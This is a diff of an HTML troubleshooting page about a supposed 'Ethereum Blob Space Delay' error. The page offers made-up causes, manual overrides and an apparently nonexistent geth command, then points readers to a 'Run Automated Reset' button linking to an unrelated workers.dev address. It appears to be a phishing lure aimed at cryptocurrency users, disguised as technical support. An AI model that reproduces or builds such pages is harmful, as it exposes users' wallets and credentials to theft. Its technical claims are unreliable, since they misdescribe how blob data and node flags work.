@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delays in accessing and retrieving data from Ethereum blob storage, resulting in slower than expected transaction processing times and potential timeouts.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues related to excessive data storage.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The Ethereum blob space delay occurs due to network congestion, high gas prices, and inefficient data storage mechanisms, leading to slower data retrieval and processing.</li>
+<li>The error occurs due to the accumulation of unused or redundant data in Ethereum's blob space, which is a storage mechanism for large data files. This accumulation can lead to slower transaction processing times and increased network congestion.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize transaction processing: </li>
-<li>Adjust the gas price using <code>eth_gasPrice</code> RPC method</li>
-<li>Optimize data storage using InterPlanetary File System (IPFS) for off-chain data</li>
-<li>Utilize layer 2 scaling solutions to reduce network congestion</li>
+<li>To mitigate the issue, users can attempt the following manual overrides:</li>
+<li>Run a node with increased memory allocation to handle larger blob data</li>
+<li>Implement a periodic pruning mechanism to remove redundant data</li>
+<li>Utilize the following command to manually clear excess blob data:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;gas&quot;:&quot;0x...&quot;,&quot;gasPrice&quot;:&quot;0x...&quot;}]}&#39;</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--cache.size<span class="w"> </span><span class="m">1024</span><span class="w"> </span>--cache.ttl<span class="w"> </span><span class="m">3600</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
+<p>Consider accessing the node through an alternative interface for more granular control.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ethereum node setup and configuration</li>
-<li>Familiarity with Ethereum RPC methods and API</li>
-<li>Basic understanding of gas mechanics and transaction processing</li>
+<li>A basic understanding of Ethereum node operation</li>
+<li>Access to the node's configuration files</li>
+<li>Sufficient system resources to handle increased memory allocation</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
